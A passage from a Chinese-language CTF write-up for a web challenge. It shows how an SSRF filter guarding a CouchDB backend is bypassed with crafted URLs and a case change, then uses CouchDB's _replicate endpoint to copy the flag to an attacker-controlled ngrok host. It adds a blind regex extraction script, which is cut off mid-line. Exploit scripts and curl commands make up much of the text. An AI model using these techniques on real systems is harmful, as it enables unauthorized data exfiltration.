&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">stringJsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsFlag&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringJsonObj&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Request method is not accepted&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对给出的url（通过url参数进行提交）进行get或者post，先检查&lt;code>if (urlURI.getHost().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>，如果为真直接报错；之后发出请求 如果&lt;code>Utils.containsFlag(stringJsonObj)&lt;/code>为真也会报错出去&lt;/p>
&lt;p>源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - &lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai&lt;/a>）&lt;/p>
&lt;p>本地先起一个环境，run on localhost:8080，&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl localhost:8080/testAPI?url&lt;span style="color:#f92672">=&lt;/span>https://couchdb:5984/&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>GET
Illegal!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://localhost:8080/createUser?username&lt;span style="color:#f92672">=&lt;/span>neptunian&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>neptunian
&lt;span style="color:#75715e"># Creating user&lt;/span>
success
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Listing &amp;#34;neptunian&amp;#34; database documents, using our credentials (jq formats our JSON output)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{fake}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -vv http://localhost:8080/testAPI?method&lt;span style="color:#f92672">=&lt;/span>GET&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>http://neptunian:neptunian&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984/neptunian
...
success
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># Simple POST Test&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Local&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:8080/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 2,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>,
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e"># There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的&lt;/p>
&lt;p>而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;source_db_name&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#f92672">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://dest_user:dest_password@destination_host/dest_database&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url &lt;a href="https://2d0a4710580a.ngrok.io">https://2d0a4710580a.ngrok.io&lt;/a>，先创建数据库来便于接收之后复制的数据&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># POST Replication&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;neptunian&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># response = requests.get(&amp;#39;http://localhost:8080/testAPI&amp;#39;, headers=headers, params=params)&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://requester.mc.ax/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>好耶！复制怪好耶！&lt;/p>
&lt;p>虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~&lt;/p>
&lt;p>————以下是第二种解法: char-by-char-blind-sqli&lt;/p>
&lt;p>源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST -H &lt;span style="color:#d88200">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find&amp;#39;&lt;/span> --data &lt;span style="color:#d88200">&amp;#39;{&amp;#34;selector&amp;#34;:{&amp;#34;flag&amp;#34;: {&amp;#34;$regex&amp;#34;: &amp;#34;.*&amp;#34;}}}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#75715e"># first, make a request to&lt;/span>
&lt;span style="color:#75715e"># /createUser?username=strellicsquad&amp;amp;password=12345&lt;/span>
&lt;span style="color:#111">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;etoanihsrdlucgwyfmpbkvjxqz&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find&amp;#34;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;selector&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;$regex&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">}}})&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://requester.mc.ax/testAPI/?url=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;amp;method=POST&amp;amp;data=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span 